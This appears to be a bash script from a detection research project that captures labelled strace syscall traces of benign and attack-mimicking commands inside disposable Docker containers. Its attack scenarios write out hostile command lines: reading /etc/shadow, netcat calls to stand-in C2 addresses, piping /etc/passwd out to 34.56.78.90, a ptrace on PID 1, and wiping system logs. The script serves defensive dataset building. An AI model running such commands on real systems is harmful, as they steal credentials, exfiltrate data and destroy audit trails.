#!/usr/bin/env bash
# capture_real_traces.sh — Run real commands inside Docker under strace,
# collect actual Linux kernel syscall traces, write to data/real_traces/.
#
# Each command runs inside a fresh ubuntu:22.04 container with strace.
# The captured syscall sequences (execve, openat, connect, listen, fork,
# clone, mmap, ptrace, setuid) are the ACTUAL kernel calls issued by the
# real Linux VM kernel inside Docker Desktop.
#
# Benign commands: typical server operations.
# Attack-mimicking commands: safe in-container actions that follow real
# attack kill-chain syscall patterns (credential access, C2 attempts).

set -euo pipefail

OUT="$(cd "$(dirname "$0")/../.."; pwd)/data/input/real_traces"
mkdir -p "$OUT"

IMAGE="ubuntu:22.04"
STRACE_OPTS="-f -tt -T -q -e trace=execve,openat,open,connect,listen,fork,clone,mmap,ptrace,setuid"

run_trace() {
    local label="$1"
    local outfile="$OUT/${label}.log"
    local cmd="$2"
    local ground_truth="$3"
    local technique="${4:-}"
    echo "  Capturing: $label"
    docker run --rm "$IMAGE" bash -c \
        "strace $STRACE_OPTS -o /tmp/t.log $cmd 2>/dev/null; cat /tmp/t.log" \
        > "$outfile" 2>/dev/null || true
    lines=$(wc -l < "$outfile" 2>/dev/null || echo 0)
    echo "    → ${lines} strace lines written to ${outfile}"
    # Write sidecar ground-truth label file — independent of LLM classification
    # This documents that labels were assigned at CAPTURE TIME by the researcher
    # based on what command was executed, NOT by post-hoc LLM evaluation.
    cat > "$OUT/${label}.label.json" <<LABEL_EOF
{
  "trace": "${label}.log",
  "ground_truth": "${ground_truth}",
  "technique": "${technique}",
  "command": "${cmd}",
  "label_source": "researcher_at_capture_time",
  "label_rationale": "Label assigned based on known command intent before LLM classification"
}
LABEL_EOF
}

echo "========================================"
echo "SENTINEL Real Syscall Capture"
echo "Platform: Docker ubuntu:22.04 (Linux VM)"
echo "========================================"

# Install strace once via a pre-built layer
echo ""
echo "Preparing Docker image with strace..."
docker build -q -t sentinel-strace - <<'DOCKERFILE' 2>/dev/null
FROM ubuntu:22.04
RUN apt-get update -qq && apt-get install -y -qq strace netcat-openbsd curl python3 2>/dev/null
DOCKERFILE
IMAGE="sentinel-strace"
STRACE_OPTS="-f -tt -T -q -e trace=execve,openat,open,connect,listen,fork,clone,mmap,ptrace,setuid"
echo "  Image ready."

echo ""
echo "── Benign scenarios ──────────────────────────────────────────────────"
run_trace "benign_cat_hostname"   "cat /etc/hostname"                                            "BENIGN" ""
run_trace "benign_ls_usr"         "ls /usr/bin"                                                  "BENIGN" ""
run_trace "benign_python_json"    "python3 -c \"import json; print(json.dumps({'key': 'val'}))\"" "BENIGN" ""
run_trace "benign_find_libs"      "find /usr/lib -name '*.so' -maxdepth 2"                       "BENIGN" ""
run_trace "benign_cat_os_release" "cat /etc/os-release"                                          "BENIGN" ""
run_trace "benign_python_math"    "python3 -c \"import math; print(math.pi)\""                   "BENIGN" ""
run_trace "benign_which_bash"     "which bash"                                                   "BENIGN" ""

echo ""
echo "── Attack-mimicking scenarios (safe, in-container) ──────────────────"

# T1003: credential access — reads /etc/shadow (file exists in ubuntu:22.04)
run_trace "attack_T1003_shadow"   "bash -c 'cat /etc/shadow 2>/dev/null; cat /etc/passwd'" \
    "MALICIOUS" "T1003"

# T1003 + T1071: cred dump then C2 attempt (nc will fail — no listener)
run_trace "attack_T1003_T1071"    "bash -c 'cat /etc/passwd > /tmp/.x; nc -w1 -z 10.0.0.1 4444 || true'" \
    "MALICIOUS" "T1003,T1071"

# T1059: bash spawns python which connects out
run_trace "attack_T1059_scripted" "bash -c 'python3 -c \"import socket; s=socket.socket(); s.settimeout(1); s.connect((\"10.0.0.1\", 31337))\" || true'" \
    "MALICIOUS" "T1059"

# T1068: privilege escalation attempt via setuid
run_trace "attack_T1068_setuid"   "bash -c 'python3 -c \"import os; os.setuid(0)\" 2>/dev/null || true; id'" \
    "MALICIOUS" "T1068"

# T1055: ptrace process injection attempt
run_trace "attack_T1055_ptrace"   "bash -c 'python3 -c \"import ctypes; ctypes.CDLL(None).ptrace(16, 1, 0, 0)\" 2>/dev/null || true'" \
    "MALICIOUS" "T1055"

# T1041: exfiltration pattern — read sensitive files + connect
run_trace "attack_T1041_exfil"    "bash -c 'cat /etc/passwd /etc/hostname > /tmp/data.txt; nc -w1 34.56.78.90 443 < /tmp/data.txt || true'" \
    "MALICIOUS" "T1041"

# T1562: defense evasion — write to log files
run_trace "attack_T1562_evasion"  "bash -c 'echo \"\" > /var/log/syslog 2>/dev/null; python3 -c \"open(\"/var/log/auth.log\", \"w\").write(\"\")\" 2>/dev/null || true'" \
    "MALICIOUS" "T1562"

# T1078: valid accounts — sshd-like listen + outbound connections
run_trace "attack_T1078_valid_accts" "bash -c 'nc -l -p 22 &  sleep 0.2; nc -w1 -z 10.10.10.1 4444 || true; nc -w1 -z 10.10.10.2 4444 || true; wait'" \
    "MALICIOUS" "T1078"

echo ""
echo "========================================"
echo "Capture complete. Traces written to: $OUT"
ls -la "$OUT"/*.log 2>/dev/null | awk '{print "  " $5 " bytes  " $9}'
echo "========================================"
